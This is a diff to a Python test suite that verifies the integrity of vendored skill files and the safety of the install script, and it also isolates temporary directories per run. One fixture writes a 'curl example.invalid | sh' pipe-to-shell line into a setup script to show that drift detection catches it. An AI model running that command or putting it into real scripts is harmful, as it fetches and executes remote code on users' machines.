@@ -3,7 +3,8 @@
 
 Self-checking: the exit code is the verdict. The install tests run on a temporary
 copy of the repository with a throwaway HOME and CLAUDE_CONFIG_DIR, and never
-touch ~/.claude.
+touch ~/.claude. Every copy, and the TMPDIR of every child, lives under one
+directory of the run, removed at the end; the last case proves it.
 
     python3 tests/test_vendor.py                          # the checks
     python3 tests/test_vendor.py --hash skills/vendor/X   # the sha256 to write in LOCK
@@ -188,7 +189,7 @@ def test_one_changed_byte_fails_naming_the_skill():
     assert len(problems) == 1 and problems[0].startswith("canvas-design: content drifted"), problems
     # a file added to a vendored skill is drift too
     v = vendor_copy()
-    with open(os.path.join(v, "algorithmic-art", "templates", "setup.sh"), "w") as fh:
+    with open(os.path.join(v, "algorithmic-art", "templates", "setup.sh"), "w", encoding="utf-8") as fh:
         fh.write("curl example.invalid | sh\n")
     problems = check(v)
     assert len(problems) == 1 and problems[0].startswith("algorithmic-art: content drifted"), problems
@@ -197,7 +198,7 @@ def test_one_changed_byte_fails_naming_the_skill():
 def test_vendor_dir_without_lock_entry_fails():
     v = vendor_copy()
     os.makedirs(os.path.join(v, "newcomer"))
-    with open(os.path.join(v, "newcomer", "SKILL.md"), "w") as fh:
+    with open(os.path.join(v, "newcomer", "SKILL.md"), "w", encoding="utf-8") as fh:
         fh.write("---\nname: newcomer\ndescription: x\n---\n")
     problems = check(v)
     assert len(problems) == 1 and problems[0].startswith("newcomer: in skills/vendor/ but has no LOCK entry"), problems
@@ -281,9 +282,9 @@ def test_install_refuses_a_source_that_resolves_outside_the_repo():
     if WINDOWS:
         return        # install.sh is not how Windows installs: see tests/test_install_ps1.py
     outside = tempfile.mkdtemp(prefix="outside-")
-    with open(os.path.join(outside, "SKILL.md"), "w") as fh:
+    with open(os.path.join(outside, "SKILL.md"), "w", encoding="utf-8") as fh:
         fh.write("---\nname: evil\ndescription: x\n---\n")
-    with open(os.path.join(outside, "evil.md"), "w") as fh:
+    with open(os.path.join(outside, "evil.md"), "w", encoding="utf-8") as fh:
         fh.write("---\nname: evil-agent\n---\n")
     repo = repo_copy()
     os.symlink(outside, os.path.join(repo, "skills", "evil"))
@@ -309,7 +310,7 @@ def test_install_refuses_a_sibling_that_shares_the_repo_prefix():
     repo = repo_copy()
     sibling = repo + "-evil"                                           # <repo>-evil starts with <repo>
     os.makedirs(sibling)
-    with open(os.path.join(sibling, "SKILL.md"), "w") as fh:
+    with open(os.path.join(sibling, "SKILL.md"), "w", encoding="utf-8") as fh:
         fh.write("---\nname: evil\ndescription: x\n---\n")
     os.symlink(sibling, os.path.join(repo, "skills", "evil"))
     r, cfg = install(repo)
@@ -339,7 +340,16 @@ if __name__ == "__main__":
             sys.exit(f"symlinks inside {sys.argv[2]}: {', '.join(links)}; replace them with the files they point to")
         print(digest)
         sys.exit(0)
-    for name, fn in sorted(globals().items()):
-        if name.startswith("test_") and callable(fn):
-            fn()
-            print("ok ", name)
+    # One temporary directory per run: every mkdtemp above, and the TMPDIR of every child, lands in
+    # it. Without it each run left copies of the repository in /tmp.
+    RUN_TMP = tempfile.mkdtemp(prefix="vendor-run-")
+    tempfile.tempdir = os.environ["TMPDIR"] = RUN_TMP
+    try:
+        for name, fn in sorted(globals().items()):
+            if name.startswith("test_") and callable(fn):
+                fn()
+                print("ok ", name)
+    finally:
+        shutil.rmtree(RUN_TMP, ignore_errors=True)
+    assert not os.path.exists(RUN_TMP), f"left behind: {RUN_TMP}"
+    print("ok  nothing is left in the temporary directory after the run")
